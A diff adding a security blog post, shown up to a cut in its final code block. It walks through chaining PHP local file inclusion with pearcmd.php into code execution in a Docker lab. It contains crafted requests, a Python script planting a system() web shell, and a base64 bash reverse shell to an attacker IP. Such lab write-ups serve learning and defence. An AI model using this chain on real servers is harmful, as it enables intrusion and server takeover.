@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>PHP &lt;= 7.3 Local File Inclusion RCE with LFI (PoC) - H4ndSH</title><meta name="Description" content="Hugo theme - LoveIt"><meta property="og:title" content="PHP &lt;= 7.3 Local File Inclusion RCE with LFI (PoC)" />
+<meta property="og:description" content="This post aims to acquire knowledge about exploiting vulnerabilities in web systems. In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the &lsquo;pearcmd.php&rsquo; file to craft manipulated files. Within a web environment, we can leverage the functionalities of &lsquo;pearcmd&rsquo; by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://h4ndsh.github.io/2023/phpinfo/" /><meta property="og:image" content="https://h4ndsh.github.io/2023/phpinfo/featured-image.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-10-12T00:00:00+00:00" /><meta property="og:site_name" content="H4ndSH" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://h4ndsh.github.io/2023/phpinfo/featured-image.png"/>
+<meta name="twitter:title" content="PHP &lt;= 7.3 Local File Inclusion RCE with LFI (PoC)"/>
+<meta name="twitter:description" content="This post aims to acquire knowledge about exploiting vulnerabilities in web systems. In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the &lsquo;pearcmd.php&rsquo; file to craft manipulated files. Within a web environment, we can leverage the functionalities of &lsquo;pearcmd&rsquo; by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments."/>
+<meta name="application-name" content="H4ndSH">
+<meta name="apple-mobile-web-app-title" content="H4ndSH"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#55309b"><link rel="icon" href="https://avatars.githubusercontent.com/u/26088700?v=4"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#55309b"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://h4ndsh.github.io/2023/phpinfo/" /><link rel="prev" href="https://h4ndsh.github.io/2023/saphety/" /><link rel="stylesheet" href="/css/style.min.49d6f433b0314fb247b1fe7c43de5820e7f136c1e1b94857d70d5de395a493e0bab1420b847934ca1c74f3cc8da6b9555719a906706dd7588919c735b9625e97.css" integrity="sha512-Sdb0M7AxT7JHsf58Q95YIOfxNsHhuUhX1w1d45Wkk+C6sUILhHk0yhx088yNprlVVxmpBnBt11iJGcc1uWJelw=="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PHP \u003c= 7.3 Local File Inclusion RCE with LFI (PoC)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/h4ndsh.github.io\/2023\/phpinfo\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/h4ndsh.github.io\/2023\/phpinfo\/featured-image.png",
+                            "width":  1431 ,
+                            "height":  816 
+                        }],"genre": "posts","keywords": "php7, phpinfo","wordcount":  1573 ,
+        "url": "https:\/\/h4ndsh.github.io\/2023\/phpinfo\/","datePublished": "2023-10-12T00:00:00+00:00","dateModified": "2023-10-12T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "h4ndsh"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="H4ndSH">H4ndSH</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/h4ndsh" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="H4ndSH">H4ndSH</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/h4ndsh" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PHP <= 7.3 Local File Inclusion RCE with LFI (PoC)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://h4ndsh.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>h4ndsh</a></span>&nbsp;<span class="post-category">included in <a href="/categories/poc/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PoC</a>&nbsp;<a href="/categories/learning/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Learning</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Oct 12, 2023">Oct 12, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1573 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/phpinfo/featured-image.png"
+        data-srcset="/2023/phpinfo/featured-image.png, /2023/phpinfo/featured-image.png 1.5x, /2023/phpinfo/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/2023/phpinfo/featured-image.png"
+        title="/2023/phpinfo/featured-image.png" /></div><div class="content" id="content"><p>This post aims to acquire knowledge about exploiting vulnerabilities in web systems. In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the &lsquo;pearcmd.php&rsquo; file to craft manipulated files. Within a web environment, we can leverage the functionalities of &lsquo;pearcmd&rsquo; by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments.</p>
+<h1 id="summary">Summary</h1>
+<ul>
+<li><a href="#summary" rel="">Summary</a></li>
+<li><a href="#introduction" rel="">Introduction</a></li>
+<li><a href="#environment-setup" rel="">Environment Setup</a>
+<ul>
+<li><a href="#docker" rel="">Docker</a></li>
+<li><a href="#php-environment" rel="">PHP Environment</a></li>
+</ul>
+</li>
+<li><a href="#exploration" rel="">Exploration</a>
+<ul>
+<li><a href="#initialization" rel="">Initialization</a></li>
+<li><a href="#exploit" rel="">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#reverse-shell" rel="">Reverse Shell</a></li>
+<li><a href="#realworld" rel="">Realworld</a></li>
+<li><a href="#mitigation" rel="">Mitigation</a></li>
+<li><a href="#references" rel="">References</a></li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>I would like to start by thanking the cybersecurity community and a few people who were instrumental in this post. First, I want to express my gratitude to <a href="https://twitter.com/phithon_xg" target="_blank" rel="noopener noreffer ">@phithon_xg</a> for all the hard work he has done. I highly recommend reading the article he published on this topic. I would also like to thank <a href="https://twitter.com/_JohnHammond" target="_blank" rel="noopener noreffer ">@_JohnHammond</a> for bringing this topic to light and creating a very informative video about this proof of concept.</p>
+<p>In this exploration, we&rsquo;ll embark on a quest to understand and exploit two critical security issues: LFI (Local File Inclusion) and RCE (Remote Code Execution). Our path leads us to the powerful &lsquo;pearcmd.php&rsquo; file, a toolkit that enables us to craft manipulated files and exert control over a web environment by manipulating command-line parameters.</p>
+<p>This post introduces a highly focused Proof of Concept (PoC), designed to push the boundaries of penetration within web environments. While specific in scope, it serves as a valuable opportunity to expand our knowledge and gain insights into innovative techniques for securing web systems. Join us on this enlightening journey as we unlock the secrets of web system vulnerabilities.</p>
+<h1 id="environment-setup">Environment Setup</h1>
+<p>The test environment will be created within a CT (Container) in Proxmox by installing PHP through Docker. This approach simplifies the setup of a testing environment, specifically with PHP version 7. However, it&rsquo;s important to note that for this environment to function as intended, there must exist a pre-existing vulnerability related to Local File Inclusion (LFI). This vulnerability is the key to our exploration and allows us to demonstrate and understand the exploitation of LFI and RCE vulnerabilities effectively.</p>
+<h2 id="docker">Docker</h2>
+<p>In this Docker code block, we are setting up a container environment based on the PHP 7.0.0 image. The COPY section copies all files from the &lsquo;app&rsquo; directory to the &lsquo;/var/www/html/&rsquo; directory within the container. We then set the working directory to &lsquo;/var/www/html/&rsquo; and start an embedded PHP server on port 8080.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-docker" data-lang="docker"><span class="k">FROM</span><span class="s"> php:7.0.0</span><span class="err">
+</span><span class="err"></span><span class="k">COPY</span> app/* /var/www/html/<span class="err">
+</span><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /var/www/html/</span><span class="err">
+</span><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0:8080&#34;</span><span class="p">]</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir app
+<span class="nb">cd</span> app
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="php-environment">PHP Environment</h2>
+<p>Here, in the &lsquo;app/index.php&rsquo; file, we have a simple PHP script. It performs a file inclusion based on the &lsquo;file&rsquo; parameter passed through the request. This is an example of vulnerable code, as there is no proper validation of the &lsquo;file&rsquo; parameter, making it susceptible to Local File Inclusion (LFI) attacks.</p>
+<p>File <code>app/index.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>In the &lsquo;app/phpinfo.php&rsquo; file, we have a script that displays PHP information in the phpinfo() format. This file doesn&rsquo;t have a specific vulnerability but is included for demonstration purposes and to provide useful information about the PHP configuration in the test environment.</p>
+<p>File <code>app/phpinfo.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="nx">phpinfo</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><h1 id="exploration">Exploration</h1>
+<p>Once the environment is configured, the container must be initialized and its bash opened.</p>
+<h2 id="initialization">Initialization</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo docker build -t phpfilerce .
+sudo docker run -d -p 8080:8080 phpfilerce
+docker ps
+sudo docker <span class="nb">exec</span> -it &lt;CONTAINER ID&gt; /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="exploit">Exploit</h2>
+<p>Once we create a phpinfo file, we will open it in the browser at <code>http://localhost:8080/phpinfo.php</code>.
+In order for this exploit to work, we should look for the &ldquo;Directive&rdquo; <code>register_argc_argv</code> and the &ldquo;Local Value&rdquo; and the &ldquo;Master Value&rdquo; should be set to &ldquo;ON&rdquo;.</p>
+<p><figure><a class="lightgallery" href="/2023/phpinfo/phpinfo_on.png" title="php info" data-thumbnail="/2023/phpinfo/phpinfo_on.png" data-sub-html="<h2>PHP Info</h2><p>php info</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/phpinfo_on.png"
+            data-srcset="/2023/phpinfo/phpinfo_on.png, /2023/phpinfo/phpinfo_on.png 1.5x, /2023/phpinfo/phpinfo_on.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/phpinfo_on.png" width="1427" height="154" />
+    </a><figcaption class="image-caption">PHP Info</figcaption>
+    </figure></p>
+<p>If so, then we can experiment with these arguments by adding the string <code>?h4ndsh</code> immediately after the &ldquo;phpinfo.php&rdquo;.
+We can verify that an array is created in $_SERVER[&ldquo;argv&rdquo;].</p>
+<p><figure><a class="lightgallery" href="/2023/phpinfo/phpinfo_argv.png" title="php info" data-thumbnail="/2023/phpinfo/phpinfo_argv.png" data-sub-html="<h2>PHP Info</h2><p>php info</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/phpinfo_argv.png"
+            data-srcset="/2023/phpinfo/phpinfo_argv.png, /2023/phpinfo/phpinfo_argv.png 1.5x, /2023/phpinfo/phpinfo_argv.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/phpinfo_argv.png" width="1459" height="230" />
+    </a><figcaption class="image-caption">PHP Info</figcaption>
+    </figure></p>
+<p>Following the post from <a href="https://twitter.com/phithon_xg" target="_blank" rel="noopener noreffer ">@phithon_xg</a> it is possible, from the phpinfo file, to invoke an action to create pearcmd files. This &ldquo;pearcmd&rdquo; is a PHP script that is used to interact with PEAR, a repository of PHP extensions and applications. It is used to install, uninstall, update, and manage PEAR packages. For this PoC, we will use the config-create function.</p>
+<p><figure><a class="lightgallery" href="/2023/phpinfo/pearcmd_config-create.png" title="pearcmd" data-thumbnail="/2023/phpinfo/pearcmd_config-create.png" data-sub-html="<h2>pearcmd config-cerate</h2><p>pearcmd</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/pearcmd_config-create.png"
+            data-srcset="/2023/phpinfo/pearcmd_config-create.png, /2023/phpinfo/pearcmd_config-create.png 1.5x, /2023/phpinfo/pearcmd_config-create.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/pearcmd_config-create.png" width="1157" height="862" />
+    </a><figcaption class="image-caption">pearcmd config-cerate</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/2023/phpinfo/pearcmd_create.png" title="config-cerate" data-thumbnail="/2023/phpinfo/pearcmd_create.png" data-sub-html="<h2>config-cerate</h2><p>config-cerate</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/pearcmd_create.png"
+            data-srcset="/2023/phpinfo/pearcmd_create.png, /2023/phpinfo/pearcmd_create.png 1.5x, /2023/phpinfo/pearcmd_create.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/pearcmd_create.png" width="955" height="57" />
+    </a><figcaption class="image-caption">config-cerate</figcaption>
+    </figure></p>
+<p>We can create the files in the terminal, or we can do something more interesting, which is, from the phpinfo.php file, from a crafted URL and execute this function.</p>
+<p>To test this action, I used <a href="https://caido.io/" target="_blank" rel="noopener noreffer ">Caido</a>, a web security auditing toolkit similar to <a href="https://portswigger.net/burp" target="_blank" rel="noopener noreffer ">BurpSuite</a>.</p>
+<p>In this request, the <code>&lt;?=phpinfo()?&gt;</code> function is placed inside the new PHP file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/h4ndsh.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">192.168.1.202:8080</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/2023/phpinfo/caido_request.png" title="caido request" data-thumbnail="/2023/phpinfo/caido_request.png" data-sub-html="<h2>caido request</h2><p>caido request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/caido_request.png"
+            data-srcset="/2023/phpinfo/caido_request.png, /2023/phpinfo/caido_request.png 1.5x, /2023/phpinfo/caido_request.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/caido_request.png" width="1256" height="256" />
+    </a><figcaption class="image-caption">caido request</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/2023/phpinfo/out.png" title="tmp folder" data-thumbnail="/2023/phpinfo/out.png" data-sub-html="<h2>Beffore / After</h2><p>tmp folder</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/out.png"
+            data-srcset="/2023/phpinfo/out.png, /2023/phpinfo/out.png 1.5x, /2023/phpinfo/out.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/out.png" width="1184" height="110" />
+    </a><figcaption class="image-caption">Beffore / After</figcaption>
+    </figure></p>
+<p>The <code>index.php</code> file plays a crucial role in our testing. It was intentionally designed with a vulnerability inserted, allowing us to call the file we are injecting. In a real-world or Capture The Flag (CTF) environment, different methods may be needed to trigger the injected file. The screenshot shows the contents of index.php, highlighting the vulnerability.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/phpinfo/vulnerability_file.png"
+        data-srcset="/2023/phpinfo/vulnerability_file.png, /2023/phpinfo/vulnerability_file.png 1.5x, /2023/phpinfo/vulnerability_file.png 2x"
+        data-sizes="auto"
+        alt="/2023/phpinfo/vulnerability_file.png"
+        title="index.php" width="1339" height="237" /></p>
+<p>Now, we are prepared to test our command injection capabilities by opening index.php, which is designed to include any specified file. To do this, we provide the precise path to the file we want using the tool Caido, accessed via <code>http://localhost:8080/index.php?file=/tmp/h4ndsh.php</code>. If the injection works, the PHPinfo page should reappear, indicating success.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/phpinfo/h4ndsh_file_resquest.png"
+        data-srcset="/2023/phpinfo/h4ndsh_file_resquest.png, /2023/phpinfo/h4ndsh_file_resquest.png 1.5x, /2023/phpinfo/h4ndsh_file_resquest.png 2x"
+        data-sizes="auto"
+        alt="/2023/phpinfo/h4ndsh_file_resquest.png"
+        title="h4ndsh_file_resquest" width="1056" height="218" /></p>
+<p>In order to inject commands into the server effectively, I am planning to create a custom &lsquo;console&rsquo; that is accessible via a URL. To streamline this process and eliminate the need for manual URL adjustments in a web browser or the use of tools like Burp Suite, I have chosen to utilize Python3. This decision allows for automation, making the testing process more efficient and controlled.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">http.client</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.202&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="c1"># Create console </span>
+<span class="n">cmd_shell</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=die(system($_GET[&#39;cmd&#39;]))?&gt;&#34;</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/</span><span class="si">{</span><span class="n">cmd_shell</span><span class="si">}</span><span class="s2">+/tmp/h4ndsh.php&#34;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>URL: <code>http://192.168.1.202:8080/index.php?file=/tmp/h4ndsh.php&amp;cmd=id</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/phpinfo/id_cmd.png"
+        data-srcset="/2023/phpinfo/id_cmd.png, /2023/phpinfo/id_cmd.png 1.5x, /2023/phpinfo/id_cmd.png 2x"
+        data-sizes="auto"
+        alt="/2023/phpinfo/id_cmd.png"
+        title="id" width="1566" height="102" /></p>
+<h1 id="reverse-shell">Reverse Shell</h1>
+<p>In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker&rsquo;s machine, providing the attacker with control over the server. To achieve this, the author plans to modify a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address &ldquo;192.168.1.110&rdquo; and port &ldquo;2030&rdquo; specified as the connection destination.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/192.168.1.110/2030 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64 -w <span class="m">0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Add the new code to the existing code, replacing <code>&lt;base64&gt;</code> with the set of characters generated by the base64 command.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="c1"># inject the command</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;&lt;base64&gt;&#39;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;/index.php?file=/tmp/h4ndsh.php&amp;cmd=echo+</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">|base64+-d|bash&#34;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This code only injects our console line into our <code>cmd</code> parameter created previously. Remembering that the file to which the commands are being written and interpreted in PHP, we have to add &ldquo;echo cmd | base64 -d | bash&rdquo; so that it is decoded (-d) and to be executed.</p>
+<p>The complete code would look like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">http.client</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.202&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="c1"># Create console </span>
